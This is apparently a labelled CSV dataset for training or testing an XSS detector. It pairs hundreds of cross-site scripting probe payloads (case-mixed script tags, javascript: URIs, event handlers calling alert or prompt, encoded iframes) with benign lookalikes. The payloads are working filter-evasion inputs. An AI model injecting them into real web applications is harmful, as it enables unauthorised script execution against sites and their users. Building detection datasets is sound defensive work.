payload,label
&lt;a href=javascript:void(0)&gt;,0
</span>,0
<ScriPt>WINDow</SCrIpt>,1
18nBN<img onfocus=noop()>0JQs,0
HNx7<svg onfocus=prompt(1)>CMBMO5,1
opc<div onload=showMenu()>gXzqZg,0
JavasCrIPT:PROMPt(1),1
jAVAscRiPt:voId(0),0
%3Ciframe%20src%3Ddata%3Atext/html%3Bbase64%2CPHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg%3D%3D%3E,1
"<sCrIpt>sETTImeout('ALeRt(1)',1000)</SCRiPT>",1
<ScrIPT>docUmEnT.Write('<Img SrC=X OnERROR=aLERT(1)>')</ScriPT>,1
<a href=javascript:alert(1) id=x class=y style=z>c,1
jAVascriPt:coNfIRM(1),1
<IMG onfOCUs=pROMPt(1)>,1
<A onFOcuS=nOop()>,0
<sVg oNcLicK=AleRT(1)>,1
JaVaScRipT:pROMpT(1),1
<iMG ONLoAD=hiGHliGhT()>,0
<span onclick=confirm(,1
"3k<script>setTimeout('alert(1)',1000)</script>VQ",1
R8c<div onclick=validate()>RnLm12,0
%253Cspan%2520onload%253Dvalidate%2528%2529%253E,0
JAvAscRiPT:PROmPt(1),1
<ImG onFOCus=ALERT(1)>,1
javascript:ale,1
jAvasCRIpT:cONfIRm(1),1
JAVascRipT:VOid(0),0
<svg oNmOuSeOVeR=INit()>,0
<svg onclick=highlight,0
<div OnfOCUs=ValiDAte()>,0
Eb<span onload=confirm(1)>LYrBBC,1
<sPan onCliCK=hiGHliGhT()>,0
tHwW8V<img onfocus=alert(1)>KcLROa,1
<sCRIpt>WinDoW</ScrIpT>,1
<IMg oNfocuS=alert(1)>,1
DZ3LASjavascript:prompt(1)L9vpj,1
<iMg OnLoad=PrOMPt(1)>,1
w8<svg onload=confirm(1)>pINguV,1
<scrIPT>WInDOW</ScriPT>,1
<DIv ONfocus=hIghLIght()>,0
<span ONcLICk=PrOMpt(1)>,1
jAvaScRipT:VOid(0),0
2LTfjavascript:void(0)U56,0
HHcjavascript:void(0)HS,0
zvWJ<a onload=prompt(1)>tLfOo,1
<IMG onCLICk=aleRT(1)>,1
JaVAScRIpT:confIrm(1),1
"r22<script>setTimeout('alert(1)',1000)</script>mdnJLA",1
<ScrIPt>eVaL('AlErT(1)')</Script>,1
xeF<span onload=validate()>jv07,0
Ph5at<svg onclick=alert(1)>Yp,1
eLstP<div onfocus=confirm(1)>g9kU2Q,1
KhS<img onfocus=init()>ArP,0
<svg onclick=confirm(,1
56n<svg onload=prompt(1)>wVm,1
<sPan ONloAD=ProMPT(1)>,1
<Div ONmOusEOveR=vALidATE()>,0
ouX9<span onfocus=alert(1)>ty,1
<Svg OnMoUSeOvER=vALIdaTe()>,0
<Div OnMoUsEover=HigHLiGht()>,0
<svg OncliCk=coNfIrM(1)>,1
JAvaSCrIPt:aLeRT(1),1
PpDMAf<script>document.write('<img src=x onerror=alert(1)>')</script>RRDAo,1
8S<script>eval('alert(1)')</script>Br,1
<div onFOcuS=hIGHLight()>,0
<sPan ONmOuSeOVeR=shOwMENu()>,0
<A oNmoUsEoVer=proMPT(1)>,1
8Ijavascript:prompt(1)YtCr,1
pz2Hm<span onmouseover=showMenu()>qfyI,0
jAvASCriPt:Void(0),0
YTRlj<span onfocus=highlight()>oKnOL,0
<a onmouseover=alert(1),1
<Img oNClIck=pROMPt(1)>,1
"<ScRIPT>sEtTimEOUt('ALeRt(1)',1000)</scRIpt>",1
yByB<a onfocus=showMenu()>wbPlB,0
8svQKi<a onload=init()>W03,0
<svg OnfOCuS=ValidaTe()>,0
4Zejavascript:prompt(1)ZSdTdH,1
<ImG OnFocus=ValidaTE()>,0
<sPaN OnFOCUS=nOOp()>,0
<SPaN ONlOAd=hIgHLigHT()>,0
wxf2P<svg onclick=validate()>3y,0
jAVasCRIPT:ALErT(1),1
RVSG2<img onmouseover=confirm(1)>yZ3,1
<a ONloAD=InIt()>,0
PZI<img onmouseover=prompt(1)>oj,1
RbCrjavascript:void(0)8tIuj,0
<A ONfocUs=validate()>,0
t9<script>window</script>pCluou,1
<DIV OnMoUsEoVER=pROmPT(1)>,1
<SVG oNFOCUs=CoNfiRM(1)>,1
<DiV OnLOAd=ProMPT(1)>,1
<sCript>EvAL('ALerT(1)')</SCRIPT>,1
FX<a onfocus=highlight()>tVU8,0
ceC<a onfocus=confirm(1)>T4,1
<iMg oNMOuSEoVer=alErT(1)>,1
%3Cspan%20onclick%3Dprompt%281%29%3E,1
<div onclick=showMe,0
<sVG OnclIck=ALert(1)>,1
ydR9tn<a onfocus=prompt(1)>QcZBH,1
OvBv<svg onfocus=highlight()>Z1NMRc,0
<DIV oNFOCus=Alert(1)>,1
<iMg onMOuSEOveR=PRoMpT(1)>,1
JAVAScrIPt:CONfIRM(1),1
0pjavascript:prompt(1)JiNX1,1
<ScrIpt>eVAl('aLErT(1)')</SCriPT>,1
JAVAsCRIPt:ConFIRm(1),1
<a OnLOAD=vALidaTE()>,0
javaSCRIpt:VOID(0),0
WtHv8javascript:confirm(1)iN,1
<A onLOAD=shOwMenU()>,0
JAVascRIpt:vOid(0),0
jaVaScRipT:pROMPt(1),1
EWTBgF<a onload=confirm(1)>Ur,1
g6R<img onclick=confirm(1)>3z4a2c,1
"<ScRIPT>sEtTIMEouT('alErT(1)',1000)</ScRiPT>",1
<IMg SrC=X oNERror,1
<SvG OnMoUSEoVer=aLert(1)>,1
<scrIPT>WINdOw</SCRIPt>,1
b24RPjavascript:prompt(1)Ma0B,1
Pl3o<a onload=prompt(1)>Hf2M7d,1
<div onFoCus=aLeRT(1)>,1
<a ONCLICk=VaLIDAtE()>,0
3mhj<span onfocus=showMenu()>Ni,0
<svg onload=confirm(,1
EcvYGz<img onfocus=noop()>icdbn2,0
<a oNFOcus=coNfirm(1)>,1
VAML<img onclick=confirm(1)>CO,1
C7Yh<img onfocus=showMenu()>fVr,0
ZUEiWJ<svg onclick=confirm(1)>FoLsi,1
<dIv oNfOCuS=hiGhLiGHT()>,0
d4HGe<svg onmouseover=prompt(1)>Ga,1
Z71O<img onfocus=showMenu()>jAs,0
MTByoT<img onload=validate()>enu,0
"<ScRIPT>SeTtimeOut('AlERt(1)',1000)</SCRipt>",1
<a oNMOUSEovER=ShoWMeNu()>,0
jaVAScRipT:AlERT(1),1
CR4<span onfocus=init()>oO,0
<ScrIPt>EVAl('alerT(1)')</sCRIPT>,1
<sPAn OnmouSEOveR=showmENu()>,0
JavAscrIPt:VoId(0),0
<spAN oncliCk=conFirM(1)>,1
JaVascRIPT:VOId(0),0
<IMG oNMoUSEoVer=SHoWMEnu()>,0
<span onload=noop(,0
<scRIpT>docUMENT.wriTe('<IMG sRc=x onErROR=ALERT(1)>')</ScrIPT>,1
JtOHGy<span onclick=alert(1)>Gp,1
<span oNLoAd=shOWmeNu()>,0
<iMg OnMouSEoVer=PRoMpt(1)>,1
dQMIl<img onload=highlight()>pd,0
<spAN onload=PRoMPT(1)>,1
DEj<div onfocus=alert(1)>POj6i,1
<dIv oNmoUSEoVer=proMPt(1)>,1
jAVAScriPT:vOid(0),0
G8<span onmouseover=init()>ukPMY,0
JaVascRIpt:void(0),0
<Img ONmOUsEoVEr=COnFiRM(1)>,1
<DIv OnClIck=PromPT(1)>,1
0NoNB<span onload=validate()>NN0,0
<sCriPt>eVAl('aleRt(1)')</SCRIPt>,1
<svg onclick=sho,0
<sPan OnfOcUs=alErT(1)>,1
O8Gp<script>document.write('<img src=x onerror=alert(1)>')</script>Ys,1
<sVg ONFocUS=ALErt(1)>,1
7kx1javascript:alert(1)avKJE,1
JavasCrIPt:PrOmPt(1),1
jaVasCriPT:ALerT(1),1
<SVG ONlOaD=vALIdATe()>,0
nGKGcjavascript:void(0)hz,0
<SCRIpT>EvAL('ALerT(1)')</ScRIpT>,1
<svG ONFoCUS=proMPt(1)>,1
w5g<a onmouseover=validate()>kIhf9,0
<imG oNfoCUS=sHowmeNU()>,0
la7v<div onload=noop()>Omt,0
<DIV onMoUSeOvER=PrOMpt(1)>,1
CqZOKc<img onclick=highlight()>VtW0,0
<ScripT>wINdoW</scRIpT>,1
hIwo<div onmouseover=noop()>PmiOt,0
<a onclick=co,1
JaVascRiPT:CONFirM(1),1
Gj4lxgjavascript:prompt(1)xBOJFm,1
<DiV OnLoAd=alERT(1)>,1
<a onFOcus=HigHLigHT()>,0
dy<div onmouseover=prompt(1)>CHGX,1
<a ONFOCuS=ValidatE()>,0
JavASCripT:ALeRt(1),1
9t<svg onclick=prompt(1)>yf,1
<sVg OnFocus=vAlidate()>,0
<div OnmOusEoVeR=hiGHLigHt()>,0
1u<span onclick=alert(1)>OU8F,1
<a onMOUSEoveR=ALErt(1)>,1
<div oNLoaD=nOop()>,0
<Img ONLoad=Init()>,0
AcDq6G<svg onmouseover=prompt(1)>4arU,1
<spAn onfOCuS=Alert(1)>,1
DH3<script>eval('alert(1)')</script>ol6LeL,1
<DIv oNclicK=cOnFirM(1)>,1
jAVAScripT:COnfiRm(1),1
<Span ONFOCuS=alERT(1)>,1
4atw<a onload=alert(1)>P7eN,1
N2BYjavascript:prompt(1)ixtZV,1
<a OnmousEOveR=aLErT(1)>,1
<a oNClick=Alert(1)>,1
<a ONmoUseoVeR=NoOP()>,0
<sPAN OnmOUSEoVEr=PromPT(1)>,1
ccXts<span onmouseover=validate()>Dk6TV,0
<img onload=promp,1
<DIV onmousEoVeR=VAliDaTe()>,0
jAVascRipT:VoiD(0),0
jAVASCripT:VOID(0),0
NuG1mn<div onload=showMenu()>SsUO0U,0
JavaScrIpt:vOid(0),0
kyE4<div onfocus=prompt(1)>k2,1
"<scRiPT>SETTiMEOut('alert(1)',1000)</sCRIPT>",1
<Svg ONloAD=SHOWMEnU()>,0
<sVG oNcLICK=AlERt(1)>,1
JAvAscrIpt:cONfirm(1),1
<ScripT>EvAl('alerT(1)')</SCRIPt>,1
<scrIPt>eVal('ALeRT(1)')</sCriPT>,1
<DIv onfOcUS=Noop()>,0
egw4<svg onload=confirm(1)>w6,1
<A OnClICK=proMPt(1)>,1
JAvaSCRipt:PROmpt(1),1
88s<img onclick=validate()>fWre4f,0
8pH<script>document.write('<img src=x onerror=alert(1)>')</script>iNfP2x,1
<sVG oNClIck=hiGHliGHt()>,0
"3PYKo<script>setTimeout('alert(1)',1000)</script>pQ",1
h9Bzj<a onload=highlight()>sw2v,0
<A oNcliCK=confIrm(1)>,1
JAVAscRipT:VoId(0),0
xoX6LEjavascript:void(0)sS2Ub,0
<sVg ONFocus=hiGHLIghT()>,0
<SPan onMOuSEovEr=ValIDaTe()>,0
JaVAsCRipT:vOID(0),0
<SpAn ONmOuseOVEr=AlERt(1)>,1
<Span OnLoAd=INIT()>,0
javAsCripT:prOmPt(1),1
<div onload=con,1
JavASCrIpT:VOID(0),0
kWBac<img onmouseover=showMenu()>og1Bmk,0
ftk2FBjavascript:prompt(1)GYf,1
<DIv OnloAd=NoOp()>,0
<span onload=,1
JAvaSCRIPt:PRomPt(1),1
H2lm6<a onclick=confirm(1)>FTNL,1
<imG oNLOAD=pROMPT(1)>,1
<spAn oNclICK=CoNfiRM(1)>,1
%253Cscript%253Econsole.error%2528%2527err%2527%2529%253C/script%253E,0
<a onFocUS=vaLidaTe()>,0
%3Csvg%20onclick%3Dhighlight%28%29%3E,0
dvjavascript:alert(1)b2Z,1
<dIV OncLICk=ShOwmENu()>,0
cCys<img onfocus=showMenu()>I3o321,0
<DiV onmOUSEoVeR=PROmPT(1)>,1
<iMG ONfOcuS=ValIdAte()>,0
<SCRIPT>docUmeNT.wrITE('<IMg src=x onERroR=aLeRT(1)>')</sCript>,1
<A oNmouseoVeR=cONFiRm(1)>,1
jAVaSCrIpT:PRompT(1),1
<DIV onMoUSEovEr=HigHlIght()>,0
<sPaN oNMoUsEovER=cONFIRm(1)>,1
<SvG oNMouSEoVEr=proMPt(1)>,1
WyQ<span onclick=highlight()>hrDq3,0
Nm3gpw<img onmouseover=highlight()>Y1Hm,0
<SPAN oNfOCus=proMPT(1)>,1
<SvG OnmOusEOVEr=nooP()>,0
jAVaSCRIpt:VOId(0),0
<sCRipt>eVAl('aLert(1)')</SCrIpT>,1
<scriPt>WiNdow</SCrIPT>,1
jAvAScRIPt:PrompT(1),1
ms<script>document.write('<img src=x onerror=alert(1)>')</script>jMu,1
"&lt;div style=""background-image:url(javascript:alert(1))""&gt;",1
VmQyR<a onmouseover=noop()>gwbZc,0
<iMG onfOcus=vaLiDATE()>,0
<div ONlOAd=VALiDAtE()>,0
<Script>WiNdoW</SCRiPT>,1
<SVg oNLoad=CoNfirm(1)>,1
<DIV ONlOaD=iniT()>,0
5r<svg onfocus=alert(1)>j0,1
<SCrIpT>window</SCRIPt>,1
KSleZ<a onload=showMenu()>oleak,0
<DIv ONLoad=VaLIdATE()>,0
yP7R<img onclick=prompt(1)>Gs,1
<scRIpT>Eval('AlErT(1)')</ScrIPt>,1
0hv<span onmouseover=confirm(1)>Tj,1
JAvasCripT:Void(0),0
<IMG Onload=HiGhLIgHt()>,0
<SVG oNMOuseovER=conFiRM(1)>,1
jAvASCRiPt:PROMpt(1),1
<svg onload=noo,0
l69<svg onfocus=showMenu()>PS,0
<Span ONMOUSeovER=alert(1)>,1
VFzGJ<svg onclick=showMenu()>67,0
<DiV oNlOad=pROmpT(1)>,1
<img ONfocus=iNIt()>,0
U6Ww<script>window</script>nsKBjh,1
<sPaN onLoad=vAlIDAtE()>,0
<svg onclick=ini,0
<sVg OnClick=InIt()>,0
AOlEDNjavascript:void(0)qu,0
<sVg oNMOuseOvEr=aLeRT(1)>,1
<SpAN onfocUS=vALIdATe()>,0
5ki3<img onmouseover=prompt(1)>D2PD,1
<scRIpt>WiNdOW</sCrIpT>,1
RMhiVl<img onclick=prompt(1)>7yuN5,1
<a oNMOuseovEr=pRompT(1)>,1
<ImG onfoCUS=cONfirM(1)>,1
hb<svg onfocus=confirm(1)>BHwI,1
79OUFU<img onclick=validate()>kwW5PX,0
<SCrIpt>dOcuMEnt.wrItE('<Img sRc=X ONerROr=aLErT(1)>')</ScRIPT>,1
<a onMoUSeOVer=proMpT(1)>,1
"tAKS0<script>setTimeout('alert(1)',1000)</script>7hpli",1
"RO<script>setTimeout('alert(1)',1000)</script>kz",1
k0Q4d<span onload=highlight()>Cr,0
<ScRipT>doCumeNT.wRiTE('<iMg src=x OnErROr=aLErT(1)>')</SCript>,1
<div onclick=confirm(,1
<a onClICK=pROmpT(1)>,1
<a onCLIck=sHowMENu()>,0
qQV<div onclick=showMenu()>3TTfW,0
jAVAScrIPT:PrOMpT(1),1
<svg onmouse,0
GRZ3Y<span onmouseover=confirm(1)>Et,1
<iMG onfOcuS=init()>,0
<span onmous,0
M5javascript:void(0)Mxo2,0
qrlIl<img onfocus=highlight()>TQE,0
<ImG OnCLick=coNfIrM(1)>,1
767vujavascript:prompt(1)fSQ1a,1
"<scrIPt>sEtTimEOUT('alErT(1)',1000)</SCRiPt>",1
<span onclick=in,0
EzF2<span onload=alert(1)>Sq9N1Y,1
<SpaN OnMOuSeOVER=aLErt(1)>,1
<SVG onLoAD=COnfiRm(1)>,1
<dIV ONlOAd=cONFIRM(1)>,1
jAvASCrIpt:aLert(1),1
<sPAn oNclIcK=cOnFirm(1)>,1
<SpaN ONLoaD=hiGHliGhT()>,0
<sPaN onfoCuS=COnfIrm(1)>,1
<script>evaL('ALeRT(1)')</ScRipt>,1
%3Cspan%20onmouseover%3Dprompt%281%29%3E,1
<A ONmOUsEoVER=SHoWMEnU()>,0
<SpAn ONLOAD=noOP()>,0
<a oNlOAd=noOP()>,0
<SCriPT>EvAl('aLERT(1)')</scriPT>,1
<iMG ONlOAD=vaLidate()>,0
JavaSCriPT:voiD(0),0
<sVg OnclIck=ConfIrM(1)>,1
<Div OnLOAd=valIDaTe()>,0
<SVg ONfocUS=AlERt(1)>,1
gTS<script>eval('alert(1)')</script>v6Tky,1
<ScRipt>WindOw</sCRIPt>,1
ne<span onclick=showMenu()>W5hq,0
99uejavascript:alert(1)p0DLW6,1
<dIv onFOcUs=VaLIdatE()>,0
BBdMYR<span onfocus=init()>kZ7,0
<svg onclick=,1
<DiV ONfocus=ValiDaTE()>,0
<sVg onLOAd=CoNfIRM(1)>,1
<Svg onFOcUS=PrOMpT(1)>,1
y9vbK<script>eval('alert(1)')</script>3LK,1
jAvAScrIPT:cONfirm(1),1
<a OnFoCuS=ALErt(1)>,1
JAVASCRiPT:prOmpt(1),1
Z959sP<div onclick=alert(1)>fJafpJ,1
<SVG oNMouseOVer=PRompt(1)>,1
JAvASCrIPT:VOId(0),0
nE<script>document.write('<img src=x onerror=alert(1)>')</script>2n,1
<a OnMOUseoVER=cONFIRM(1)>,1
<SpaN ONlOad=highlIghT()>,0
Cg<script>eval('alert(1)')</script>lx,1
dxe30<img onclick=init()>7nrNx,0
jAvasCrIpt:CONFirm(1),1
QRRjavascript:prompt(1)nY,1
<Img onclICK=ALerT(1)>,1
rGe<span onmouseover=confirm(1)>JaDO,1
jAVascrIpt:PROMpt(1),1
<iMG Onload=CONFirm(1)>,1
"<SCripT>SeTtIMeOUT('Alert(1)',1000)</SCRIPT>",1
idZcsK<script>document.write('<img src=x onerror=alert(1)>')</script>ZckB,1
siBrXh<svg onmouseover=prompt(1)>aN0,1
<Img ONLOAD=NOOp()>,0
<SpaN onloAd=alErT(1)>,1
<A onmouSeOVer=PROmpT(1)>,1
javascRipt:proMPt(1),1
rW<img onclick=confirm(1)>C0nD,1
<span onload=high,0
JaVaScRIPt:PrOMPt(1),1
R9YSVd<script>document.write('<img src=x onerror=alert(1)>')</script>hVu9LJ,1
<DIV OnLOad=shOWMENu()>,0
JAVAscriPT:coNfIRM(1),1
GoiaMC<div onmouseover=showMenu()>yKlq,0
<A onCLiCK=PROMpt(1)>,1
C8vm<span onfocus=highlight()>5abys,0
<A OnlOaD=iniT()>,0
<iMG OnFOcuS=coNFirM(1)>,1
t9K<img onclick=alert(1)>zaZEJ,1
<a OnLoAD=ShOwMenu()>,0
hhmn<img onfocus=init()>YN31fM,0
<ImG OnMOUSEOVEr=AlErt(1)>,1
<SVg Onclick=inIt()>,0
<a oNClIck=VALIdAtE()>,0
<scrIpt>WinDow</SCRIpt>,1
<spAN oNfoCUS=IniT()>,0
WeaCVjavascript:alert(1)vt,1
rPR<span onclick=prompt(1)>tX6,1
<ScRipt>DOcUmENt.WrITe('<imG sRC=x oNERRoR=aLErt(1)>')</ScrIpt>,1
<SCrIPt>evaL('ALeRt(1)')</ScrIPT>,1
jaVASCRiPT:PRoMPT(1),1
<SVg onFocUs=ShowmENU()>,0
A7Lc<span onfocus=prompt(1)>JAi,1
"<sCRiPT>SetTiMEOut('ALeRt(1)',1000)</SCrIPt>",1
jAVASCriPT:PRoMpT(1),1
AdqA4<span onfocus=validate()>7n,0
<IMG oNfocus=NooP()>,0
<div onfocus=showMe,0
fU<script>document.write('<img src=x onerror=alert(1)>')</script>jdZBf,1
<sPAN ONClIck=NOOp()>,0
JaVAScRIPT:ProMpT(1),1
<sPAN OnCliCk=alert(1)>,1
jAvaScripT:vOID(0),0
<IMG oNCLick=cONfIRM(1)>,1
<diV ONMouSeovER=cONfIrm(1)>,1
"<sCrIPt>SettiMEOUT('aLErt(1)',1000)</SCrIpt>",1
<A ONClICk=HiGHlIgHt()>,0
<iMG oNmOuSEoVER=ConfIRM(1)>,1
jaVaScriPT:coNfiRM(1),1
pWbWjavascript:void(0)OOMr,0
<svg onload=showMen,0
jAVAscrIpT:alERT(1),1
<a oNmOUsEOVer=COnFirM(1)>,1
<spAN oNclIcK=PrOmpT(1)>,1
<span onfocus=sh,0
eS<img onmouseover=init()>odQOQW,0
<Div onfOCus=valIdATE()>,0
<span onmouseover=c,1
<IMg OncliCk=aLerT(1)>,1
hUg7oW<a onfocus=validate()>bkCP,0
"<SCrIpt>sEttiMEouT('alERT(1)',1000)</ScrIPT>",1
S74CP<img onmouseover=prompt(1)>5p,1
"<scRiPt>SEttImeoUt('aleRT(1)',1000)</SCRiPT>",1
MiUj<img onload=confirm(1)>Iwo,1
<img onmouseover=highlight()>,0
<diV oNmouSEOver=alErt(1)>,1
<a onload=showMen,0
0HGfNE<span onload=prompt(1)>M3bdn,1
F2zuaz<span onmouseover=validate()>NGUH,0
oV<div onload=init()>giFiyq,0
"<sCrIpt>SEtTiMEOUt('AlerT(1)',1000)</SCRIPT>",1
<A oNCLIck=conFirM(1)>,1
<A oNclicK=VaLiDAtE()>,0
NBl<a onload=prompt(1)>ud1,1
<A onlOad=NOoP()>,0
<Img OnfoCus=nOoP()>,0
<a onfocus=noop(),0
HeQ7Xyjavascript:void(0)B7,0
<SpAN OnFOCus=ALErT(1)>,1
raOcy<img onclick=confirm(1)>AvZDgh,1
jAvAsCRIpt:vOid(0),0
<svg onclick=prompt,1
<SCrIpt>evAl('alert(1)')</scriPT>,1
<Span oNmoUSEoVER=PRoMpT(1)>,1
<SVg ONmOusEoVER=ShOwMeNu()>,0
"<SCRIpt>seTTimeOUt('aleRT(1)',1000)</sCRiPT>",1
<A onfOCus=aLert(1)>,1
TDN<span onclick=highlight()>A9,0
<DIv ONmOuseovER=shOwMEnU()>,0
<iMg onmouseovEr=iNiT()>,0
JXYTyw<script>document.write('<img src=x onerror=alert(1)>')</script>50I0dD,1
rI1r<span onclick=noop()>z6,0
<dIv oNFOcUS=noop()>,0
JaVaScrIPt:void(0),0
<A oNmOUSeoVEr=NOop()>,0
<SVg ONMOUSeOVer=CoNfIrM(1)>,1
Iqp<div onmouseover=showMenu()>IOEjP,0
jaVascRipT:alERT(1),1
jaVAsCRIPt:alerT(1),1
jAvascRIpT:vOID(0),0
<DiV oNLOaD=ProMPt(1)>,1
pYb<svg onfocus=noop()>7r32jG,0
uJZZ<div onclick=prompt(1)>8RVyl,1
MUs7C0javascript:void(0)oyc3,0
<ScRIpT>wINDOW</sCrIPT>,1
<SpaN oNlOaD=iNiT()>,0
<sCrIPT>dOCumeNT.WRITe('<img src=X ONERrOr=aleRt(1)>')</ScrIPt>,1
JqYCJ<img onfocus=showMenu()>mXcpE,0
JAVASCrIpT:CoNFIRM(1),1
<DIV OnClICK=cONFiRm(1)>,1
<DiV onLOaD=HiGhliGht()>,0
d6pqV1<svg onmouseover=alert(1)>i5aR3w,1
CC<div onclick=noop()>a5h24a,0
<scRIPt>dOCUMENt.WRiTE('<IMG srC=x onerrOR=aLERt(1)>')</scriPT>,1
peFJH<a onload=noop()>hmm,0
"<sCRipt>seTTIMEOuT('aLERT(1)',1000)</scRiPt>",1
"<scripT>SettIMeOUT('aLeRT(1)',1000)</ScrIPt>",1
zdDZ<a onfocus=prompt(1)>5qW0,1
<a oNclICK=sHoWMEnu()>,0
<DIV OnloaD=InIT()>,0
<IMg onClicK=CoNFIrm(1)>,1
<sCRipT>wINdOW</sCRiPT>,1
<A onload=PRomPT(1)>,1
<Script>WiNdOw</SCrIpT>,1
<svG oNFOcUs=CONFIrm(1)>,1
<SCrIPt>DoCumEnt.WRITE('<IMg Src=X onERrOr=aLeRT(1)>')</ScriPT>,1
vlac<script>window</script>A0,1
<spAN onClIck=HighLigHT()>,0
<IMG OnMOUSEOver=ALeRT(1)>,1
FY7b<svg onload=alert(1)>Z9Aoh,1
LrC3dq<img onclick=confirm(1)>ooc,1
Swfi5Cjavascript:void(0)GFNzc,0
JAvaSCRiPT:CoNFIrm(1),1
ta<a onload=validate()>lMhyb,0
<SCRIPt>DocUMEnt.wRITe('<imG sRC=X OnerrOr=aLErt(1)>')</ScRiPt>,1
feKFCjavascript:alert(1)j7J,1
<IMG onlOAd=noOP()>,0
<SVG ONFOCUs=cONFIRM(1)>,1
<IMG ONfocUs=pROMPT(1)>,1
<iMG ONlOAD=HIgHLight()>,0
<A onFocUS=SHoWMENu()>,0
"<SCRipT>sETtiMeouT('aLERT(1)',1000)</scripT>",1
JaVasCrIPt:voiD(0),0
jAVAScript:AleRt(1),1
<ScrIpt>doCumenT.WriTE('<IMG src=x ONerROR=aLeRt(1)>')</ScRiPT>,1
jaVaScript:cOnfIrm(1),1
<SvG oNloaD=noop()>,0
Br<img onload=init()>CEKk0,0
<A OnMOUSEOVer=NOop()>,0
b1lq<svg onclick=showMenu()>U8G,0
<A OnfocuS=SHOWMEnu()>,0
"<sCrIpt>SettiMEOut('ALert(1)',1000)</scRiPT>",1
<sCRIPt>docUMENt.WRITe('<imG SrC=X ONErROR=AleRT(1)>')</SCRIpT>,1
<dIV OnMousEOvEr=INit()>,0
<spaN oNFOCus=proMpt(1)>,1
HRqzgK<span onclick=validate()>8ur,0
<SVG oNmoUseOVER=proMpt(1)>,1
<DIV ONlOAd=SHowMEnU()>,0
<Svg ONcLICK=NoOP()>,0
jaVaScrIpt:aLERt(1),1
agaJ<span onmouseover=noop()>t6E,0
<IMG OnfOcus=CoNFirm(1)>,1
wjFPwy<svg onclick=alert(1)>zz05,1
wiH<script>window</script>7Hk,1
<a onfocus=confir,1
%253Cimg%2520onclick%253Dinit%2528%2529%253E,0
hKxmjavascript:confirm(1)vGK0rf,1
JAvAScriPt:vOiD(0),0
yRCmn<div onclick=alert(1)>Zoi,1
JavascriPT:COnFIrm(1),1
Z7X<span onclick=confirm(1)>FUDr57,1
<SPaN ONmoUsEOveR=aLeRt(1)>,1
<SpAn OnMOUSEovER=SHoWmenu()>,0
nnqzHd<img onmouseover=highlight()>BnjS8e,0
<a onlOaD=vaLIDAte()>,0
JAvAscriPT:AlerT(1),1
<SVg ONmOuSEoVEr=ConFIrM(1)>,1
buBXE<img onmouseover=validate()>w6kG,0
<svg onload=highli,0
<span OnLoaD=cOnfIrM(1)>,1
<dIV onFOCUs=alErt(1)>,1
<SCriPt>DocUMEnt.WRite('<ImG sRC=X ONeRroR=aleRt(1)>')</ScRiPt>,1
<sCript>document.wrITE('<ImG sRC=X ONeRrOR=aLERT(1)>')</SCRIPt>,1
<SPAn onMOuSeoVeR=ConFIrm(1)>,1
<iMG ONLOaD=ShOwMenu()>,0
Jw<div onload=alert(1)>2iUK,1
J6v<a onmouseover=prompt(1)>P6SqrR,1
<Img oNLoAD=CoNFiRM(1)>,1
VBO77r<img onload=init()>uCf,0
<scRipt>EvAl('ALERt(1)')</scRIPt>,1
<SvG onMouSEOVer=SHoWmenU()>,0
mrG<script>window</script>aVripG,1
LWJoNjjavascript:alert(1)tD,1
<Div onMoUseOvEr=aLerT(1)>,1
<DIV OnLOaD=sHOwmEnU()>,0
KUvI<a onload=alert(1)>9rI,1
<script>window</script>,1
JaVAsCript:voiD(0),0
<span onmouseover=showMenu(,0
<A oNFOCUs=ShoWmEnu()>,0
<IMG oNloAd=CONfIrM(1)>,1
<spAN onCLiCK=ALERt(1)>,1
<img onfocus=hi,0
<dIV ONCLick=aLERT(1)>,1
<A onFoCUs=aLeRT(1)>,1
<Img onfOcus=PRoMPT(1)>,1
l9xdBGjavascript:void(0)Hg,0
javAsCrIpt:VoID(0),0
Vp<svg onmouseover=alert(1)>ls,1
tQ8<svg onmouseover=showMenu()>dGwk,0
&lt;script&gt;console.log('test')&lt;/script&gt;,0
jAvascRIPt:VoId(0),0
javascript:,0
rwZpIZ<div onmouseover=confirm(1)>suMch,1
<ImG OnLoAd=sHOWMeNU()>,0
DZm<img onload=noop()>FlE6sS,0
<sVg ONcliCk=PromPT(1)>,1
<svg onmouseover=sho,0
<span onclick=highligh,0
<a ONcLiCK=shOWMeNu()>,0
LYZwo<div onclick=alert(1)>dsu,1
<div onload=highl,0
<div onFOcus=shoWMEnu()>,0
"<scrIPT>SEtTIMeOUT('AleRT(1)',1000)</Script>",1
V2<svg onload=alert(1)>QS96ow,1
<span oNFOCus=NOop()>,0
JaVAscRipT:VoiD(0),0
<svg ONLOAd=hiGHLIGhT()>,0
